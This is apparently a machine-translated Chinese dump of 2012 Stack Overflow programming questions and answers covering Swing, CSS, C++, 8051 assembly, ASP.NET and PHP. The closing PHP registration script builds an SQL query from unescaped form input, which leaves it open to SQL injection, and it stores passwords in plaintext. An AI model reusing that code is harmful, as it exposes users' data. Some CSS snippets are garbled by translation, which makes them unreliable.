        timer = new Timer(50, new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent ae) {
                myDraw.repaint();
            }
        });
    }

    class StartListener implements ActionListener {
        public void actionPerformed(ActionEvent e) {
            // needs to be implemented
            if (!isClicked) {
            }
            isClicked = true;
            timer.start();
        }
    }

    class StopListener implements ActionListener {
        public void actionPerformed(ActionEvent e) {
            // needs to be implemented
            timer.stop();
            isClicked = false;
        }
    }

    class DrawPanel extends JPanel {
        @Override
        public void paintComponent(Graphics g) {
            int red = (int) (Math.random() * 256);
            int blue = (int) (Math.random() * 256);
            int green = (int) (Math.random() * 256);

            g.setColor(new Color(red, blue, green));

            Random rand = new Random();
            // following 4 lines make sure the rect stays within the frame
            int ht = rand.nextInt(getHeight());
            int wd = rand.nextInt(getWidth());

            int x = rand.nextInt(getWidth() - wd);
            int y = rand.nextInt(getHeight() - ht);

            g.fillRect(x, y, wd, ht);
        }
    } // close inner class
} 
```

要在按下 Start 按钮时清理屏幕，您必须向 DrawPanel 类添加一些方法。

这是一种方法。

```
class DrawPanel extends JPanel {
        protected boolean eraseCanvas;

        public void setEraseCanvas(boolean eraseCanvas) {
            this.eraseCanvas = eraseCanvas;
        }

        @Override
        public void paintComponent(Graphics g) {
            if (eraseCanvas) {
                g.setColor(Color.WHITE);
                g.fillRect(0,  0, getWidth(), getHeight());
            } else {
                int red = (int) (Math.random() * 256);
                int blue = (int) (Math.random() * 256);
                int green = (int) (Math.random() * 256);

                g.setColor(new Color(red, blue, green));

                Random rand = new Random();
                // following 4 lines make sure the rect stays within the frame
                int ht = rand.nextInt(getHeight());
                int wd = rand.nextInt(getWidth());

                int x = rand.nextInt(getWidth() - wd);
                int y = rand.nextInt(getHeight() - ht);

                g.fillRect(x, y, wd, ht);
            }
        }
    } // close inner class 
```

# android - 跨Android库的Eclipse“打开超级实现”？

> ID：13822021
> 
> 赞同：0
> 
> 时间：2012-12-11T14:38:43.243
> 
> 标签：android, eclipse

当从使用该库的 Android 项目中单击“打开声明”时，如何让 Eclipse 打开一个 Android 库项目的源文件，而不是我无法就地修改的荒谬的“反编译”.class 类似文件的再现？

重现步骤：

*   创建Android库项目A
*   创建标准Android项目B
*   从项目 B，参考项目 A
*   从 B 中的 A 覆盖受保护的方法
*   在B中，点击“Open super implementation”，进入A，尝试修改源码

软件：

*   Eclipse 版本：4.2.1 构建 ID：M20120914-1800
*   Android开发工具包版本：21.0.0.v201210310015-519525
*   OS X 版本：10.8.2
*   m2e - Eclipse 1.2.0.20120903-1050 的 Maven 集成

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-11T15:14:16.617

部分答案：看不到“荒谬反编译的类文件”，请单击同一页面上的“附加源”（类文件，如再现）并选择您正在使用的库的源文件夹。但这不可编辑。

# javascript - 使用开关结构的初学者脚本未运行

> ID：13822023
> 
> 赞同：0
> 
> 时间：2012-12-11T14:39:20.877
> 
> 标签：javascript, switch-statement

所以这是我要运行的脚本：

```
<head>
<meta http-equiv="content-type" content="text/xml;
charset=utf-8" />
<title>rollDie.html</title>
<script type = "text/javascript">
//<![CDATA[
// DiceRomanNumbers
var die = Math.ceil(Math.random() * 6);
var output = "";
switch(die){
case 1:
    output = "I";
    break;
case 2:
    output = "II";
    break;
case 3:
    output = "III";
    break;
case 4:
    output = "IV";
    break;
case 5:
    output = "V";
    break;
case 6:
    output = "VI";
    break;
default:
    output = "PROBLEM!!!";
} // end switch
</script>
</head>
</html> 
```

但是，当我运行它时，什么也没有出现。应该出现的是一个带有罗马数字 1-6 的对话框。谁能指出错误？我一直在强调为什么它现在不能运行一个小时。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-11T14:41:56.367

出现在哪里？设置后你什么也没做`output`。在切换后添加以下内容：

```
alert(output); 
```

[**编辑**]：[小提琴样本](http://jsfiddle.net/TmqVb/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-11T14:46:02.487

您的输出永远不会显示，因为您没有任何显示它的代码。对于一个简单的测试，添加`alert(output);`.

另请注意，使用对象文字可以更好地编写大多数 javascript switch 语句：

```
var numerals = {
    '1': 'I',
    '2': 'II',
    '3': 'III',
    '4': 'IV',
    '5': 'V',
    '6': 'VI'
};

alert(numerals[Math.ceil(Math.random() * 6)]); 
```

[在这里](http://jsfiddle.net/M9qda/)查看它的实际应用。

# html - 浮动侧边栏的内容进入主容器

> ID：13822025
> 
> 赞同：2
> 
> 时间：2012-12-11T14:39:35.257
> 
> 标签：html, css

假设我有这个 html：

```
<div id="sidebar">
 TestTestTestTestTestTest
</div>
<div id="content">
 Content
</div> 
```

这个CSS：

```
#sidebar {
 float:left;
 width:15%;    
 border:1px solid red;
}
#content {
 float:left;
    width:75%;
    border:1px solid green;
} 
```

正如您[在此处](http://jsfiddle.net/t4rNp/)看到的，侧边栏上的内容位于内容容器下方。我怎样才能避免这种情况，以便它会打破一条线并继续在侧边栏中？

​​​ ![重叠内容](../Images/33f191e19523f8a19ede1e120dba237d.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-11T14:47:52.543

如果没有空格，则无法管理文本。

您可以避免在此问题上添加**省略号**`#sidebar`：

```
overflow: hidden;
text-overflow: ellipsis; 
```

[http://jsfiddle.net/t4rNp/3/](http://jsfiddle.net/t4rNp/3/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-11T14:56:26.230

有2种方法：

1）添加

> 自动换行：断词；

在你的#sidebar。因为 TestTestTestTest 是一个单词，所以您需要应用我提到的 css。

[关于自动换行的说明](http://www.w3schools.com/cssref/css3_pr_text-overflow.asp)

2) 添加

> 溢出：隐藏；文本溢出：省略号；

到#sidebar。这种方法虽然不会打破界限。

[关于文本溢出的说明](http://www.w3schools.com/cssref/css3_pr_text-overflow.asp)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-11T15:20:43.817

您的文本比容器的宽度更宽，并且溢出到相邻的 div 中。

即：TestTestTestTestTest > 15% 宽度

例如，将侧边栏 div 中的内容更改为仅 Test 将停止文本与相邻 div 重叠。

我希望将 div 的溢出更改为隐藏，这样任何不适合该框的文本都不会显示，而不是溢出。

# ftp - 被动 ftp 端口管理

> ID：13822028
> 
> 赞同：-1
> 
> 时间：2012-12-11T14:39:40.477
> 
> 标签：ftp, port, passive-mode

我确实在我的软件中使用了被动 ftp，以便客户可以下载软件更新。现在我的疑问是，如果对 ftp（用于下载更新）的请求如此之多，那么被动 ftp 端口是否可以管理所有请求？它是如何工作的？ ?

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-11T15:29:31.950

一个编写良好的通用服务器可以在一个端口上处理数万个连接，没问题。客户端 IP/端口是连接的一部分，因此理论上您可以在单个端口上拥有数百万个连接。

通过 FTP PASV 传输，服务器为您的客户端提供了一个额外的端口来连接，以便将文件主体传输到控制通道之外。

一个简单的服务器将简单地为每个未完成的传输绑定一个临时端口。这将导致上限远高于 30,000。

一些 FTP 服务器将允许您配置 PASV 端口范围，这可以使这个数字更小，这可以在幼稚的实现中限制连接到您的服务器的并发用户的数量。

更高级的 FTP 服务器实现将允许多个客户端连接到 PASV 传输端口，并使用客户端的公共 IP 来管理每个公共 IP 正在请求或发送哪些文件。

实际上，如果您使用较宽的端口范围，您更有可能在服务器上遇到带宽、CPU、磁盘或其他系统限制，而不是遇到某种网络/端口范围限制。

# c++ - 树删除节点

> ID：13822032
> 
> 赞同：0
> 
> 时间：2012-12-11T14:39:55.037
> 
> 标签：c++, algorithm, binary-tree

我正在尝试完成删除功能。

这是伪代码，注意结尾：![](../Images/ef6009caf997358a659aedc2bdd95a4c.png)

我不知道伪代码是否错误。

以下是我的解释：

```
Node* minNode = Minimum(toDelete->right);

            int tmp = 0;
            tmp = minNode->val;
            // delete(&tmp);
            free(minNode);
            minNode=NULL;
            toDelete->val=tmp; 
```

除了一旦删除它，它就会在打印时开始填充一万亿个零。

我在做什么有意义吗？我所拥有的其余代码是正确的，或者无论如何我都这么认为。它只会在这种情况下搞砸。

这也是最小功能

```
Node* BST::Minimum(Node *curr) {

    // if (curr->left != NULL) {
    //      return(Minimum(curr->left));
    //  }
    //  return curr;
    Node* node = curr;
    while (node->left != NULL) {
        node = node->left;
    }
    return node;

} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-11T18:10:25.403

那是一些可怕的伪代码，乍一看它甚至看起来都不正确（如果这是一个二叉搜索树，正如`BST`所表明的那样，那么圆圈部分是错误的）。互联网上有更多关于二叉搜索树的信息。

无论如何，您都试图在右子树中找到最小的元素，因为它小于右子树中的所有其他元素，但大于左子树中的所有其他元素。

看起来你的最小功能是正确的。释放后需要删除对 minNode 的引用。`(minNode->parent)->left`如果您没有父指针，那么= NULL 或稍微乏味的东西。现在这`left`只是指向内存中的一个空白空间，导致完全随机的行为。

# asp.net - 使用 ASP.Net GridView 排序和分页

> ID：13822034
> 
> 赞同：2
> 
> 时间：2012-12-11T14:39:56.227
> 
> 标签：asp.net, vb.net, gridview, paging, gridview-sorting

我们设置了一个 ASP.Net GridView 并包括排序和分页。当用户单击 GridView 列标题链接以对数据进行排序时，或者如果用户单击 GridView 底部的数字链接以对数据进行分页，则没有任何反应。

这是 GridView 标记的缩减版本：

```
<asp:UpdatePanel 
    ID="UpdatePanelSummary" 
    runat="server" 
    UpdateMode="Always">

    <ContentTemplate> 

        <h1>Maintenance</h1>

        <% '-- GridView (Grid) for summary.                                                      -- %>
        <% '-- The user chooses a summary row from here and details are shown in a DetailsView.  -- %>
        <% '--------------------------------------------------------------------------------------- %>

        <asp:GridView
            ID="GridViewSummary" 
            runat="server" 
            AllowSorting="True" 
            AutoGenerateColumns="False" 
            DataKeyNames="ID" 
            Width="224px" 
            AllowPaging="True" 
            PageSize="7">

            <Columns>
                <asp:BoundField DataField="Unit" HeaderText="Unit" 
                    SortExpression="Unit" />

                <asp:BoundField DataField="TheName" HeaderText="Name" 
                    SortExpression="TheName" />

                <asp:BoundField DataField="ID" 
                    HeaderText="ID" SortExpression="ID" InsertVisible="False" ReadOnly="True" 
                    Visible="False" />

                <asp:CommandField ButtonType="Button" SelectText="Select Unit Details" 
                    ShowSelectButton="True" />
            </Columns>
        </asp:GridView>
    </ContentTemplate>
</asp:UpdatePanel> 
```

由于什么都没有发生，我们假设我们需要在代码隐藏文件中编写一些代码。你能告诉我们唤醒排序和分页需要什么编码吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-11T14:46:00.487

查看这篇文章 [使用 gridview asp.net 进行排序和分页](https://stackoverflow.com/questions/702600/sorting-and-paging-with-gridview-asp-net)

基本上，您需要添加服务器端事件处理程序以进行排序和分页。

这是一个示例 - 您可以复制/粘贴大部分内容。

[http://www.dotnetspider.com/resources/1249-Grid-View-Paging-Sorting.aspx](http://www.dotnetspider.com/resources/1249-Grid-View-Paging-Sorting.aspx)

# android - 如何针对 Android 平台优化代码？

> ID：13822035
> 
> 赞同：0
> 
> 时间：2012-12-11T14:40:05.827
> 
> 标签：android, optimization, inline, renderscript

我是一名 iOS 开发人员，我正在考虑进入 Android 开发。

在 Objective-C 中，我习惯于使用`inline`指令和低级代码来优化和调整特定的热点（例如图像处理）。

我如何在 Android 中做同样的事情？答案是Renderscript吗？Renderscript 是否与所有 Android 设备兼容？

至少，我是否可以指定某些方法应该被内联以节省极其、极其紧凑的循环中的过程调用？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-11T14:46:42.633

> 我如何在 Android 中做同样的事情？

如果“相同”是指“使用内联指令和低级代码”，通常您不会“做同样的事情”。Java中没有“`inline`指令”。欢迎您使用 NDK 将本机代码添加到您的 Android 应用程序。

> 答案是Renderscript吗？

Renderscript Compute 可用于提高 Renderscript Compute 擅长的事物的性能，而图像处理往往是其中之一（至少对于某些类型的处理，如过滤器）。

> Renderscript 是否与所有 Android 设备兼容？

AFAIK 它应该可以在所有运行 API 级别 11 及更高版本（又名 Android 3.0+）的 Android 设备上使用。

> 我可以指定某些方法应该被内联以在非常非常紧凑的循环中节省过程调用吗？

不会。Dalvik JIT 将根据自己的内部启发式检测和优化此类代码。

# regex - 正则表达式，获取字符串第二次出现后的内容

> ID：13822037
> 
> 赞同：2
> 
> 时间：2012-12-11T14:40:05.977
> 
> 标签：regex, string, find

我有以下格式的字符串：

`TEXT####TEXT####SPECIALTEXT`

我需要得到`SPECIALTEXT`，基本上是在第二次出现之后`####`。我无法完成它。谢谢

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-12-11T14:43:48.690

正则表达式`(?:.*?####){2}(.*)`包含您在其第一组中寻找的内容。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-11T14:44:01.687

如果您正在使用 shell 并且可以使用`awk`它：

从一个文件：

```
awk 'BEGIN{FS="####"} {print $3}' input_file 
```

从一个变量：

```
awk 'BEGIN{FS="####"} {print $3}' <<< "$input_variable" 
```

# php - Amazon S3 签名的 url 不适用于 flowplayer

> ID：13822039
> 
> 赞同：1
> 
> 时间：2012-12-11T14:39:07.127
> 
> 标签：php, amazon-s3, digital-signature, flowplayer

我到处搜索，但找不到答案。我在 PHP 中使用 flowplayer 和 amazon s3。如果我复制和粘贴，该链接在浏览器中有效，但似乎 flowplayer 不喜欢查询字符串。我尝试替换 html 实体，然后对其进行 url 编码。我只是尝试对它进行 url 编码。我只是尝试删除 & 并替换为 & 等。这些都不起作用。

我的目标是使用流播放器播放来自 amazon s3 的 url 签名视频。

我知道我没有要显示的代码，因为没有一个是“正确的”，但有人有什么建议吗？他们将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-04-19T09:01:47.447

我遇到了同样的问题，并通过阅读 Flowplayer cloudfrontsignedurl 插件的 ActionScript 源代码找到了答案：

[http://flash.flowplayer.org/documentation/developer/development-environment.html](http://flash.flowplayer.org/documentation/developer/development-environment.html)

```
private function _getUrl(clip:Clip):String {

    var url:String = clip.getPreviousResolvedUrl(this);

    var isRTMPStream:Boolean = url.toLowerCase().indexOf('mp4:') == 0;
    if ( isRTMPStream )
        //gets the url, minus the "mp4:" at the beginning
        url = url.substr(4);

    //gets the expires time in seconds
    var expires:Number = Math.round((new Date()).getTime() / 1000 + _config.timeToLive);

    //generate the signed url
    var signedUrl:String = _signedUrlGenerator.signUrl(url, expires);

        //put the 'mp4:' back on the front
    if ( isRTMPStream )
        signedUrl = 'mp4:'+ signedUrl;

    return signedUrl;

} 
```

请注意它是如何在对 url 签名之前删除“mp4:”前缀的，然后再将其添加回来。

我按照亚马逊的例子，在这里： [http ://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/CreateURL_PHP.html](http://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/CreateURL_PHP.html)

然后我的 JavaScript 配置的相关部分如下所示：

```
var netConnectionUrl = "rtmpte://amazon_distribution_domain_name.cloudfront.net/cfx/st";
var clipUrl          = "folder/folder/videofile.mp4";

$.post('/path/getSignedUrl.php', {clipUrl:clipUrl}, function(signedUrl){
  clipUrl = 'mp4:'+signedUrl;

  ...then add netConnectionUrl and clipUrl to Flowplayer config...
}); 
```

我更喜欢使用 PHP 而不是 Flowplayer 插件，这样我还可以在签署 URL 之前检查以确保用户已登录并拥有产品等，并且能够使用 PHP 进行域和 IP 地址检查也无需为使用 Ant 或 Flash Builder 编译而大惊小怪。这样，私钥就不会离开客户端。使用插件意味着盗版者可能会窃取 SWF 文件，但通过使用 AJAX 并在服务器上签名 url，则意味着无法窃取。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-15T18:33:46.203

使用[此扩展](https://github.com/DigitalBodyGuard/S3SignURL)程序创建签名 URL 并确保其有效

确保路径正确，即本地或全局路径....

尝试播放未签名的 URL，然后将其翻转到已签名的 URL

# assembly - 8051 的数字电压表

> ID：13822040
> 
> 赞同：0
> 
> 时间：2012-12-11T14:39:03.103
> 
> 标签：assembly, 8051

我必须使用组件在 8051 上创建一个数字电压表。我有一个在 LCD 上以十六进制输出，但我无法让它以十进制输出。

```
lcd_cmd equ 0800h               ;Write COMMAND reg address 0800h
lcd_st  equ 0801h               ;Read STATUS reg address 0801h
lcd_wr  equ 0802h               ;Write DATA reg address 0802h
lcd_rd  equ 0803h               ;Read DATA reg address 0803h
LEDs    equ p1              ;LEDs on port 1
DAC equ 0600h               ;DAC mapped at address 0600h
    ORG 08100h

DVM:    mov P2, #(lcd_cmd SHR 8)        ;load P2 with high address
    mov R0, #(lcd_cmd AND 255)      ;load R0 with command reg addr

    mov R7,#00h
    mov dptr, #mesg3
    acall   wr_string

    mov R7,#40h
    mov dptr, #mesg3
    acall   wr_string

    mov R7, #01h            ;set LCD position, line=1, char=1
    mov dptr, #mesg1            ;point to mesg1
    acall   wr_string           ;write mesg1 to LCD

    mov R7, #41h            ;set LCD position, line= 2, char=1
    mov dptr, #mesg2            ;point to mesg2
    acall   wr_string

    acall   start               ;repeat 

    acall   print_hex3

    sjmp DVM
Start:
    mov dptr,#DAC           ;load dptr address of DAC
    mov R7,#10000000b           ;initialise Event
    mov a,#0                ;initialise DAC value
nxtbit: xrl a,r7                ;Ex-OR DAC value with Event
    movx    @dptr,A             ;Output DAC value
    acall   delay
    jb  P3.5,keep           ;if comparator +ve keep set bit
    xrl a,R7                ;else reset bit
keep:   xch a,R7                ;R7?A (move R7 to A so we can rotate it)
    clr c               ;make sure we put zero in MSB
    rrc a               ;Rotate R7 right through carry
    xch a,R7                ;R7?A (mov A back to R7 & restore A)
    jnc nxtbit              ; repeat nxtbit until all bit done
    cpl a               ;invert Dac Value
    mov LEDs,a              ;write Dac Value to LEDs
    ret

wr_string:  acall   lcd_busy        ;wait until LCD not busy
    mov a, R7               ;get LCD position
    orl a, #080h            ;msb set for LCD RAM address
    movx    @R0, a              ;write lcd_cmd to set line & char

nxt_char:
    acall   lcd_busy            ;wait until LCD not busy
    clr a
    movc    a, @a+dptr          
    inc dptr                ;point to next byte in string
    jz  str_end             ;if 0 then end of string

    mov R1, #(lcd_wr AND 255)       ;Load R1 with wr_data address
    movx    @R1, a              ;Write char to LCD
    sjmp    nxt_char            ;get next char in string
str_end:    ret

lcd_busy:   
    mov R1, #(lcd_st AND 255)       ;Load R1 with status address
    movx    a, @R1              ;read LCD status
    jb  acc.7, lcd_busy         ;keep checking until busy bit clear
    ret

print_hex3: 
    PUSH   ACC
    SWAP   A
    ANL    A,#0FH
    ADD    A,#HEXstring3-mvcoff3a
    MOVC   A,@A+PC
mvcoff3a:
    ACALL  char_from_Acc
    POP    ACC
    ANL    A,#0FH
    ADD    A,#HEXstring3-mvcoff3b
    MOVC   A,@A+PC
mvcoff3b:   
    AJMP   char_from_Acc
HEXstring3: 
    DB     '0123456789ABCDEF'       ;'standard' hex string

Char_from_ACC:  push    acc
        acall lcd_busy
        pop acc         ;routine to output result to LCD
        mov R1, #(lcd_wr AND 255)       ;Load R1 with wr_data address
        movx    @R1, a  
        ret

mesg1:  db  "DVM Prog ",0
mesg2:  db  "Voltage = ",0      
mesg3:  db  "                   ",0

Delay:  MOV R0, #05h    ;Load R0, R1 with huge number
loop1:  MOV R1, #08h    ;
loop2:  
    DJNZ    R1, loop2   ;Decrement R1 and jump if not zero to loop2 
    DJNZ    R0, loop1   ;Decrement R0 and jump if not zero to loop1
    ret             ;return to main prog
div16_16:
  CLR C       ;Clear carry initially
  MOV R4,#00h ;Clear R4 working variable initially
  MOV R5,#00h ;CLear R5 working variable initially
  MOV B,#00h  ;Clear B since B will count the number of left-shifted bits
div1:
  INC B      ;Increment counter for each left shift
  MOV A,R2   ;Move the current divisor low byte into the accumulator
  RLC A      ;Shift low-byte left, rotate through carry to apply highest bit to high-byte
  MOV R2,A   ;Save the updated divisor low-byte
  MOV A,R3   ;Move the current divisor high byte into the accumulator
  RLC A      ;Shift high-byte left high, rotating in carry from low-byte
  MOV R3,A   ;Save the updated divisor high-byte
  JNC div1   ;Repeat until carry flag is set from high-byte
div2:        ;Shift right the divisor
  MOV A,R3   ;Move high-byte of divisor into accumulator
  RRC A      ;Rotate high-byte of divisor right and into carry
  MOV R3,A   ;Save updated value of high-byte of divisor
  MOV A,R2   ;Move low-byte of divisor into accumulator
  RRC A      ;Rotate low-byte of divisor right, with carry from high-byte
  MOV R2,A   ;Save updated value of low-byte of divisor
  CLR C      ;Clear carry, we don't need it anymore
  MOV 07h,R1 ;Make a safe copy of the dividend high-byte
  MOV 06h,R0 ;Make a safe copy of the dividend low-byte
  MOV A,R0   ;Move low-byte of dividend into accumulator
  SUBB A,R2  ;Dividend - shifted divisor = result bit (no factor, only 0 or 1)
  MOV R0,A   ;Save updated dividend 
  MOV A,R1   ;Move high-byte of dividend into accumulator
  SUBB A,R3  ;Subtract high-byte of divisor (all together 16-bit substraction)
  MOV R1,A   ;Save updated high-byte back in high-byte of divisor
  JNC div3   ;If carry flag is NOT set, result is 1
  MOV R1,07h ;Otherwise result is 0, save copy of divisor to undo subtraction
  MOV R0,06h
div3:
  CPL C      ;Invert carry, so it can be directly copied into result
  MOV A,R4 
  RLC A      ;Shift carry flag into temporary result
  MOV R4,A   
  MOV A,R5
  RLC A
  MOV R5,A      
  DJNZ B,div2 ;Now count backwards and repeat until "B" is zero
  MOV R3,05h  ;Move result to R3/R2
  MOV R2,04h  ;Move result to R3/R2
  RET

    end 
```

底部的大部分是用于进行 16 位划分的代码，但我无法将其链接到十六进制。我也有问题弄清楚代码是如何工作的。任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-11T16:43:34.960

您的值似乎只有 8 位，还是我遗漏了什么？我认为打印所述值的 16 位除法没有多大用处。我会将十的幂存储在一个表中并使用减法，类似于以下 C 代码：

```
void print(unsigned char x)
{
    const unsigned char powers[] = { 100, 10, 1 };
    int i;
    int lz = 1;
    for(i = 0; i < 3; i += 1)
    {
        int digit = 0;
        while(x >= powers[i])
        {
            x -= powers[i];
            digit += 1;
        }
        if (i == 2 || digit != 0 || !lz)
        {
            putchar('0' + digit);
            lz = 0;
        }
    }
    putchar('\n');
} 
```

当然，如果你需要按一定范围进行缩放，你将需要除法，但到目前为止的问题只提到了打印。

# c++ - 在 C++ 中包装多个库的策略

> ID：13822046
> 
> 赞同：2
> 
> 时间：2012-12-11T14:40:42.950
> 
> 标签：c++, wrapper, abstraction

我有一个类`Foo`，我不直接实现它，而是包装外部库（例如`FooXternal1`或`FooXternal2`）我见过的一种方法是使用预处理器指令作为

```
#include "config.h"
#include "foo.h"
#ifdef _FOOXTERNAL1_WRAPPER_
//implementation of class Foo using FooXternal1
#endif

#ifdef _FOOXTERNAL2_WRAPPER_
//implementation of class Foo using FooXternal2
#endif 
```

和 a`config.h`用于定义这些预处理器标志（`_FOOXTERNAL1_WRAPPER_`和`_FOOEXTERNAL2_WRAPPER_`）。我的印象是 C++ 程序员社区不赞成这种做法，因为它使用预处理器指令，难以调试等。此外，它不允许两种实现并行存在。

我考虑过创建`Foo`一个基类并从它继承，以允许两个实现彼此并行存在。但是我遇到了两个问题：

1.  纯虚函数：`cannot instatiate an object of type 'Foo'`，我在使用过程中需要的。
2.  虚函数冒着运行没有（正确）实现的对象的风险。

我错过了什么吗？有没有更清洁的方法来做到这一点？

**编辑：**总而言之，有 3(.5?!) 种包装方法 - 2(.5) 由 icepack 给出，最后一种由 Sergey 给出 1- 使用工厂方法 2- 使用预处理器指令 2.5- 使用 makefile 或IDE 有效地完成预处理器指令的工作 3.5- 使用 Sergay 建议的模板

我正在开发一个资源有限的嵌入式系统，我决定使用`template<enum = default_library>`模板专业化。便于后期用户理解；至少我是这么认为的

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-11T15:16:05.870

如果外部实现的所有方法名称都相似，则可以使用模板。让外部实现看起来像：

```
class FooX1
{
public:
    void Met1()
    {
        std::cout << "X1\n";
    }
};

class FooX2
{
public:
    void Met1()
    {
        std::cout << "X2\n";
    }
}; 
```

然后，您可以使用多种变体。

**变体 1。**您可以声明模板类型的成员并将所有调用包装到外部实现，即使在调用之前有一些准备。不要忘记`impl`在`~Foo`析构函数中删除。

```
template<typename FooX>
class FooVariant1
{
public:
    FooVariant1()
    {
        impl=new FooX();
    }

    void Met1Wrapper()
    {
        impl->Met1();
    }
private:

    FooX *impl;
}; 
```

用法：

```
FooVariant1<FooX1> bar;
bar.Met1Wrapper(); 
```

**变体 2。**您可以从模板参数继承。在这种情况下，您无需声明任何成员，而只需按名称调用实现的方法。

```
template<typename FooX>
class FooVariant2 : public FooX
{
}; 
```

用法：

```
FooVariant2<FooX1> bar;
bar.Met1(); 
```

使用模板的一个缺点是没有简单的方法可以在运行时更改实现。但作为回报，您会得到更优化的代码，因为类型是在编译时生成的，并且没有虚函数表，这会使程序变慢。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-11T15:16:09.630

如果您希望这 2 个实现在运行时共存，那么接口是可行的方法（例如，您可以使用工厂方法设计模式来实例化具体对象，就像 @nm 建议的那样）。

如果你可以在编译时决定你需要什么实现，你有几个选择：

*   仍然使用接口。如果将来您在运行时需要这两种实现，这将允许轻松转换。

*   使用预处理器指令。就 C++ 而言，这里没有错。这是一个纯粹的设计问题。

*   将实现放在不同的文件中并配置您的编译器以根据设置编译其中一个 - 这实际上类似于使用预处理器指令，但它更清洁并且不会向您的代码添加垃圾（因为标志位于解决方案/makefile /无论你的编译器使用什么）。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-11T15:03:27.107

我唯一不赞成的是将两个实现都包含在同一个源文件中。这可能会让人感到困惑。否则，这是预处理器标志擅长的事情之一，特别是如果您没有同时链接两个库。这就像支持多个操作系统一样。在所有情况下提供一致的接口，并在其他地方隐藏实现细节。

type 是否`Foo`需要保存特定于每个库的任何信息？如果没有，你也许可以摆脱这个：

```
#include "Foo.h"

#if defined _FOOXTERNAL1_WRAPPER_
    #include "Foo_impl1.cpp"
#elif defined _FOOXTERNAL2_WRAPPER_
    #include "Foo_impl2.cpp"
#else
    #error "Warn about a missing define here"
#endif 
```

这样您就不必为虚函数或继承而烦恼，并且您仍然可以防止任何成员函数未实现。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-12-11T15:10:49.783

保持`Foo`抽象。提供*工厂方法*

```
Foo* MakeFoo(); 
```

分配一个 或 类型的新对象`FooImpl1`，`FooImpl2`并返回其地址。

[关于工厂方法模式的维基百科](http://en.wikipedia.org/wiki/Factory_method_pattern)。

# c# - 用 gridview 替换动态数据中的复选框

> ID：13822052
> 
> 赞同：0
> 
> 时间：2012-12-11T14:40:54.533
> 
> 标签：c#, asp.net, entity-framework, dynamic-data

如您所知，当您在数据库表中有很多元素并且该表与另一个表之间也存在关系（比如说多对多）时，当您尝试在动态数据中插入新项目时，对于外键选项你有很多可以检查的复选框。

例如，如果您有 Category 和 Products，并且您想插入一个新 Category，您将拥有如下内容：

```
 Product1    Product2   Product3   Product4
 Product5    Product6   ... 
```

当您的产品很少时，它看起来不错，但是当您拥有超过 50 000 个时，它就不行了。

如何用每个产品名称前有一个复选框的网格视图（我加载产品实体的位置）替换它们。如果我选中该复选框，则意味着我想将该产品添加到此类别（我正在创建的那个类别）。

希望你明白我想说什么。我正在考虑制作一个自定义字段（或带有自定义字段的自定义页面），但我不知道如何制作该网格视图。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-11T15:52:50.930

你如何制作一个Gridview：

```
 <asp:GridView runat="server" ID="gvMyGrid">
         <Columns>
            <asp:BoundField DataField="MyField" HeaderText="HeaderForMyField />
            ... You have a few of these 
             <asp:TemplateField HeaderText="Products">
                  <ItemTemplate>
                         <asp:Repeater runat="server" id="rptListOfProducts" OnItemDataBound="ProductsDataBound">
                             <ItemTemplate>
                                  <asp:HiddenField id="hfProductId" runat="server"
                                        Value='<%# DataBinder.Eval(Container.DataItem, "ProductId") %>'/>
                                  <asp:CheckBox id="cbProduct" runat="Server" 
                                      Text='<%# DataBinder.Eval(Container.DataItem, "ProductName") %>'
                                      Checked='<%# DataBinder.Eval(Container.DataItem, "IsThisProductSelected") %>' />  //Or some kind of flag that is true or false
                             </ItemTemplate>
                         </asp:Repeater>
                  </ItemTemplate>
         </Columns>
    </asp:GridView> 
```

然后在你的 C# 代码中你可以这样来找出用户改变了什么。

```
 foreach (Control c in rptMonitors.Items)
    {
             var productId = int.Parse(((HiddenField)c.FindControl("hfProductId")).Value);
             //And get the check box too, generate a list of ProductIds, and if they're checked or not
    } 
```

不知道这是不是你要找的，描述有点模糊

编辑：哦，如果您希望中继器中有大量条目，您可以将其包装在 AjaxControlToolkit 可折叠面板中，这样它就不会在您的屏幕上显示垃圾邮件。

# php - 使用 AJAX 无法从 PHP 获取 json 响应

> ID：13822054
> 
> 赞同：0
> 
> 时间：2012-12-11T14:40:53.430
> 
> 标签：php, jquery, ajax

我在将 ajax 响应的结果放入 html 元素时遇到问题。这是我的 php 将东西插入数据库，插入部分工作但无法将结果放入 div。

```
include('konekcija.php');

if ($_POST['form_submitted'] = 1) { 

$aktKod = mt_rand() . mt_rand() . mt_rand() . mt_rand() . mt_rand();
$sifra = $_POST['password'];
$korIme = $_POST['username'];
$email = $_POST['email'];
$upit = "INSERT INTO korisnici(Username,Password,Email,Status,AktivacioniBroj,Uloga) 
VALUES ('$korIme','$sifra','$email','verify',$aktKod,'user') ";
if(mysql_query($upit)) { $return['success'] = "Uspesna registracija"; }
else { $return['error'] = "neuspesna registracija"; }
echo json_encode($return);
mysql_close($conn);  } 
```

jQuery代码：

```
$(document).ready(function() {  
$('#prijava').click(function() {      
$.ajax({
url: "registracija.php",
type: "POST",
dataType:"json",
data: {form_submitted:1, username: $('#user').val(), password: $('#pass').val(), email: $('#email').val()},
succes: function(data) { $('#errorCol').html(data.success); }
});  });  }); 
```

